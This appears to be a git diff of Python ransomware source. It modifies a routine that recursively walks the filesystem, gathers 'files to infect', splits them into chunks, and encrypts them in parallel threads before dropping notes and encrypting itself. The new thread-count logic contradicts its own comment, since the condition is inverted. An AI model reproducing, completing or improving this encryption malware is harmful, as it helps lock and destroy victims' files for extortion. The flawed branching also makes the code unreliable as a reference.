@@ -20,7 +20,7 @@ elif sys.platform in ["win32", "win64", "Windows", "windows"]:
 
 def main():
     """
-    Take user input, recursively encrypt or decrypt the filesystem. Display beautiful artwork
+    Recursively encrypt or decrypt the filesystem. Display beautiful artwork
     """
     os.system("clear" if sys.platform == "linux" else "cls")
     exit("THIS WILL HARM YOUR COMPUTER")
@@ -38,19 +38,22 @@ def main():
 
         # Get array of files to infect
         file_array = recursive_walk(paths, target_extensions, 1)
-        if len(file_array) < 10000:
+
+        # We split the array depending on how large it is. If more than 100,000 elements exist, use 6 threads etc..
+        if len(file_array) < 100000:
+            chunks = 6
+        elif len(file_array) > 20000:
             chunks = 4
         else:
             chunks = 2
 
         threads = []
-        # Loop through each chunk in array
-        for chunk in list(create_chunks(file_array, chunks)):
+        for chunk in list(create_chunks(file_array, chunks)):  # Loop through each chunk in array
             t = AsyncEncrypt(sanctuary, chunk)  # Start a new thread for each chunk
             t.start()
             threads.append(t)
 
-        # Don't leave note or encrypt self until all threads are complete
+        # Wait until all threads have joined, then drop notes and encrypt self
         while threads:
             for t in threads:
                 if not t.is_alive():
